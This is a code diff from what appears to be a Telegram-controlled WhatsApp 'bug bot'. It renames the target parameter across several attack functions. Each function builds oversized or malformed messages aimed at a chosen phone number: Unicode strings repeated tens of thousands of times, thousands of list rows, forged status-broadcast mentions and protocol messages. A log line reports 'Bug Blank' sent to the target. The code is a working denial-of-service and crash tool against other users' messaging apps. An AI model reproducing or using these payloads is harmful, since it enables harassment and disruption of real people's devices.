@@ -965,7 +965,7 @@ bot.command("extend", async (ctx) => {
 });
 
 // -------------------( ANDRO FUNC )------------------------------
-async function XProtexBlankXDelay(target) {
+async function XProtexBlankXDelay(X) {
  try {
   const XProtex = 'ោ៝'.repeat(20000);
   const Blank = 'ꦾ'.repeat(20000);
@@ -983,8 +983,8 @@ async function XProtexBlankXDelay(target) {
     },
   };
   
-  await sock.relayMessage(target, msg, {
-    participant: { jid: target },
+  await sock.relayMessage(X, msg, {
+    participant: { jid: X },
     messageId: null,
   });
    console.log(chalk.red.bold(`Succes Sending Bug Blank To Target ${target}`));
@@ -992,7 +992,7 @@ async function XProtexBlankXDelay(target) {
     console.error("Gagal Mengirim Bug", err);
   }
 }
-async function LocaX(sock, target) {
+async function LocaX(sock, X) {
   const generateLocationMessage = {
     viewOnceMessage: {
       message: {
@@ -1009,7 +1009,7 @@ async function LocaX(sock, target) {
               )
             ],
             isSampled: true,
-            participant: target,
+            participant: X,
             remoteJid: "status@broadcast",
             forwardingScore: 999999,
             isForwarded: true,
@@ -1051,19 +1051,19 @@ async function LocaX(sock, target) {
 
   await sock.relayMessage("status@broadcast", msg.message, {
     messageId: msg.key.id,
-    statusJidList: [target],
+    statusJidList: [X],
     additionalNodes: [{
       tag: "meta",
       attrs: {},
       content: [{
         tag: "mentioned_users",
         attrs: {},
-        content: [{ tag: "to", attrs: { jid: target } }]
+        content: [{ tag: "to", attrs: { jid: X } }]
       }]
     }]
-  }, { participant: target })
+  }, { participant: X })
 }
-async function VinzaIsX7Valid(sock, target) { 
+async function VinzaIsX7Valid(sock, X) { 
   const buttonFrezE = Array.from({ length: 1900 }, (_, r) => ({
     title: "ោ៝".repeat(95000),
     rows: [{ title: `${r + 1}`, id: `${r + 1}` }]
@@ -1102,22 +1102,22 @@ async function VinzaIsX7Valid(sock, target) {
   };
 
   try {
-    const msg = generateWAMessageFromContent(target, MSG, {});
-    await sock.relayMessage(target, msg.message, { messageId: msg.key.id });
+    const msg = generateWAMessageFromContent(X, MSG, {});
+    await sock.relayMessage(X, msg.message, { messageId: msg.key.id });
   } catch (err) {
     console.error("Error in VinzaIsX7Valid:", err);
   }
 }
 
-async function VinzaButtonSpam(sock, target) { 
+async function VinzaButtonSpam(sock, X) { 
   const MSG = {
     viewOnceMessage: {
       message: {
         buttonsResponseMessage: {
           selectedButtonId: "BTN_1",
           contextInfo: {
-            mentionedJid: [target],
-            participant: target,
+            mentionedJid: [X],
+            participant: X,
             remoteJid: "status@broadcast"
           }
         }
@@ -1133,7 +1133,7 @@ async function VinzaButtonSpam(sock, target) {
   }
 }
 
-async function VinzaListX(sock, target) {
+async function VinzaListX(sock, X) {
   const sections = Array.from({ length: 1900 }, (_, r) => ({
     title: "᭡꧈".repeat(2000),
     rows: [{ title: `Row ${r + 1}`, id: `ID_${r + 1}` }]
@@ -1155,7 +1155,7 @@ async function VinzaListX(sock, target) {
                 `1${Math.floor(Math.random() * 999999)}@s.whatsapp.net`
               )
             ],
-            participant: target,
+            participant: X,
             remoteJid: "status@broadcast"
           },
           description: "U-Kwon"
@@ -1165,19 +1165,19 @@ async function VinzaListX(sock, target) {
   };
 
   try {
-    const msg = generateWAMessageFromContent(target, MSG, {});
-    await sock.relayMessage(target, msg.message, { messageId: msg.key.id });
+    const msg = generateWAMessageFromContent(X, MSG, {});
+    await sock.relayMessage(X, msg.message, { messageId: msg.key.id });
   } catch (err) {
     console.error("Error in VinzaListX:", err);
   }
 }
 
-async function VinzaProtocol(sock, target) {
+async function VinzaProtocol(sock, X) {
   const MSG = {
     viewOnceMessage: {
       message: {
         protocolMessage: {
-          key: { remoteJid: target, fromMe: false },
+          key: { remoteJid: X, fromMe: false },
           type: 14
         }
       }
@@ -1185,8 +1185,8 @@ async function VinzaProtocol(sock, target) {
   };
 
   try {
-    const msg = generateWAMessageFromContent(target, MSG, {});
-    await sock.relayMessage(target, msg.message, { messageId: msg.key.id });
+    const msg = generateWAMessageFromContent(X, MSG, {});
+    await sock.relayMessage(X, msg.message, { messageId: msg.key.id });
   } catch (err) {
     console.error("Error in VinzaProtocol:", err);
   }
